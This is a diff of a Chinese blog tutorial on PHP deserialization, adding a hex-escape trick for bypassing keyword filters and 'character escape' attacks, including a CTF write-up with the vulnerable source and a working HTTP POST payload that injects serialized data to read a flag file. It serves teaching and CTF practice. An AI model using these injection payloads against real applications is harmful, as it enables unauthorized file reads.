@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/06/13/d6a2f81e89c9b1f3.jpg">
 <meta property="article:published_time" content="2023-07-18T10:37:40.000Z">
-<meta property="article:modified_time" content="2023-07-26T14:35:57.909Z">
+<meta property="article:modified_time" content="2023-08-25T14:57:47.660Z">
 <meta property="article:author" content="pikaball">
 <meta property="article:tag" content="PHP">
 <meta property="article:tag" content="反序列化">
@@ -223,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          7k 字
+          12k 字
         
       </span>
     
@@ -234,7 +234,7 @@
         
         
         
-          59 分钟
+          97 分钟
         
       </span>
     
@@ -314,7 +314,9 @@
 
 <span class="hljs-comment"># pika_111</span></code></pre></div>
 
-<p>开头的<code>O:</code>标记声明一个对象，还有别的标记比如<code>a:</code>声明一个数组，<code>S:</code>声明一个字符串等等。</p>
+<p>开头的<code>O:</code>标记声明一个对象，还有别的标记比如<code>a:</code>声明一个数组，<code>s:</code>声明一个字符串等等。</p>
+<h2 id="Trick-使用S-标识绕过特定词语过滤"><a href="#Trick-使用S-标识绕过特定词语过滤" class="headerlink" title="Trick:使用S:标识绕过特定词语过滤"></a>Trick:使用S:标识绕过特定词语过滤</h2><p>当<code>s:</code>标识被更改为<code>S:</code>时，其值会对16进制格式字符进行解析。</p>
+<p>例如<code>s:4:&quot;flag&quot;</code>与<code>S:4:&quot;\66\6c\61\67&quot;</code>等效。</p>
 <h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><p>魔法函数是类内的特殊方法，在满足特定条件时自动触发而不需要主动调用，看一个例子：</p>
 <div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pika</span></span>&#123;
@@ -336,7 +338,7 @@
 <span class="hljs-variable">$t</span> = <span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;123&quot;</span>;
 
 <span class="hljs-comment"># Magic function is triggered.</span></code></pre></div>
-<p>上面的代码试图将pika类型对象p作为字符串与”123”拼接赋值给t，__toString()方法自动触发（此时t的值应当为”pika!123”）。</p>
+<p>上面的代码试图将pika类型对象p作为字符串与”123”拼接赋值给t，<code>__toString()</code>方法自动触发（此时t的值应当为”pika!123”）。</p>
 <p>常见魔法函数：</p>
 <table>
 <thead>
@@ -570,7 +572,114 @@
 <p>这里”var”的长度本来声明是3，改成了4</p>
 <p>输出：<code>destruct pika_00</code>，在php5和php7下表现一致。</p>
 <p>猜测这个特性的有效范围与CVE-2016-7124一致，不在此范围的php版本下直接报错退出了。</p>
-<h1 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h1><h2 id="反序列化解析特性"><a href="#反序列化解析特性" class="headerlink" title="反序列化解析特性"></a>反序列化解析特性</h2>
+<h1 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h1><p>情境：序列化之后进行过滤再反序列化。</p>
+<h2 id="字符增多"><a href="#字符增多" class="headerlink" title="字符增多"></a>字符增多</h2><p>例如：</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/where/i&#x27;</span>,<span class="hljs-string">&#x27;hacker&#x27;</span>,<span class="hljs-variable">$cmd</span>);
+    &#125;
+
+    <span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];
+    <span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-string">&#x27;show.jpg&#x27;</span>;
+
+    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$p</span>));
+    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;
+
+    <span class="hljs-variable">$q</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$s</span>);
+    <span class="hljs-variable">$name</span> = <span class="hljs-variable">$q</span>[<span class="hljs-string">&#x27;name&#x27;</span>];
+    <span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$q</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));
+
+<span class="hljs-meta">?&gt;</span>
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+   &lt;title&gt;Profile&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">container</span>&quot; <span class="hljs-title">style</span>=&quot;<span class="hljs-title">margin</span>-<span class="hljs-title">top</span>:100<span class="hljs-title">px</span>&quot;&gt;  </span>
+<span class="hljs-class">        &lt;<span class="hljs-title">img</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">data</span>:<span class="hljs-title">image</span>/<span class="hljs-title">gif</span>;<span class="hljs-title">base64</span>,&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> $<span class="hljs-title">img</span>; ?&gt;&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">img</span>-<span class="hljs-title">memeda</span> &quot; <span class="hljs-title">style</span>=&quot;<span class="hljs-title">width</span>:180<span class="hljs-title">px</span>;<span class="hljs-title">margin</span>:0<span class="hljs-title">px</span> <span class="hljs-title">auto</span>;&quot;&gt;</span>
+<span class="hljs-class">        &lt;<span class="hljs-title">h3</span>&gt;<span class="hljs-title">Hi</span> &lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> $<span class="hljs-title">name</span>;?&gt;&lt;/<span class="hljs-title">h3</span>&gt;</span>
+<span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span>
+<span class="hljs-class">&lt;/<span class="hljs-title">body</span>&gt;</span>
+<span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt;</span></code></pre></div>
+
+<p>序列化字符串：<code>a:2:&#123;s:4:&quot;name&quot;;s:8:&quot;pikaball&quot;;s:3:&quot;img&quot;;s:8:&quot;show.jpg&quot;;&#125;</code>，<br>我们希望控制img的值，只能从name下手。</p>
+<p>先给出payload，然后来说明为什么可行。</p>
+<div class="code-wrapper"><pre><code class="hljs plaintext">/?name=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:3:&quot;img&quot;;s:4:&quot;flag&quot;;&#125;</code></pre></div>
+
+<p>过滤前：</p>
+<div class="code-wrapper"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">144</span>:<span class="hljs-string">&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;&#125;<span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:8:&quot;</span>show.jpg<span class="hljs-string">&quot;;&#125;</span></code></pre></div>
+
+<p>过滤后：</p>
+<div class="code-wrapper"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">144</span>:<span class="hljs-string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;&#125;<span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:8:&quot;</span>show.jpg<span class="hljs-string">&quot;;&#125;</span></code></pre></div>
+
+<p>字符串变量在进行反序列化时依据标明的长度进行截取，而不会去看双引号的匹配情况，这是字符逃逸能发生的主要原因。此外，当最外层的花括号完成闭合之后，后面的字符串会被直接忽略。</p>
+<p>where的个数是24个，即<code>&quot;;s:3:&quot;img&quot;;s:4:&quot;flag&quot;;&#125;</code>的长度，在过滤后，每个where变成hacker使得总长度加一。过滤之后144个字符的位置恰好包含了24个hacker，而之后的恶意字符串被挤出去进行解析，完成了序列化字符串的闭合，img的值被修改为<code>flag</code>.</p>
+<h2 id="字符减少"><a href="#字符减少" class="headerlink" title="字符减少"></a>字符减少</h2><h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;
+    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);
+    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);
+&#125;
+
+
+<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;
+    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);
+&#125;
+
+<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;
+<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;
+
+<span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);
+
+<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;
+&#125;
+
+<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;
+    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);
+&#125;<span class="hljs-keyword">else</span>&#123;
+    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));
+&#125;
+
+<span class="hljs-variable">$serialize_info</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>));
+
+<span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;
+    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);
+&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;
+    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span>
+&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;
+    <span class="hljs-variable">$userinfo</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialize_info</span>);
+    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));
+&#125;</code></pre></div>
+
+<p>phpinfo给了一个跟flag有关的文件名<code>d0g3_f1ag.php</code>.</p>
+<p>payload:</p>
+<div class="code-wrapper"><pre><code class="hljs plaintext">POST /index.php?f=show_image HTTP/1.1
+Host: 3a6dfbad-d899-4d94-9450-623a0873ef9b.node4.buuoj.cn:81
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 66
+
+_SESSION[phpflag]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></pre></div>
+
+<p>增添了一个键值对<code>phpflag</code>，序列化之后：</p>
+<div class="code-wrapper"><pre><code class="hljs php">a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;guest&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;function&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;show_image&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpflag&quot;</span>;s:<span class="hljs-number">48</span>:<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="hljs-string">&quot;;&#125;&quot;</span>s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</code></pre></div>
+
+<p>过滤后：</p>
+<div class="code-wrapper"><pre><code class="hljs php">a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;guest&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;function&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;show_image&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">48</span>:<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="hljs-string">&quot;;&#125;&quot;</span>s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</code></pre></div>
+
+<p>filter将使<code>phpflag</code>被替换为空字符，而<code>s:7:&quot;</code>这个位置将会吞掉原本的结构字符串<code>&quot;;s:48:</code>。即键值对<code>phpflag</code>-&gt;<code>[48]</code>被换成了<code>&quot;;s:48:</code>-&gt;<code>1</code>，之后的恶意字符串成功逃逸，被unserialize解析。</p>
+
                 
               </div>
             
